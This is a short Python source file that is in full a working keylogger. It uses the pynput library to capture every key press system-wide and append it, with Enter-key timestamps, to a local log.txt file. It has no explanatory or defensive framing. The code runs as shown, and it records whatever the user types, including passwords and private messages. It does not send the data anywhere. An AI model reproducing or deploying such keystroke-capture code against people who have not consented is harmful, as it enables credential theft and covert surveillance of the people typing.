from pynput.keyboard import Listener
import time

def writeToFile(key):
    letter = str(key)
    letter = letter.replace("'", "")
    
    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.shift_r' or letter == 'Key.shift_l' or letter == "Key.ctrl_l" or letter == "Key.ctrl_r" or letter == "Key.alt_l":
        letter = ''
    
    with open("log.txt", "a") as f:
        if letter == "Key.enter":
            timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"\n[{timestamp}]\n")
        else:
            f.write(letter)

with Listener(on_press=writeToFile) as l:
    l.join()
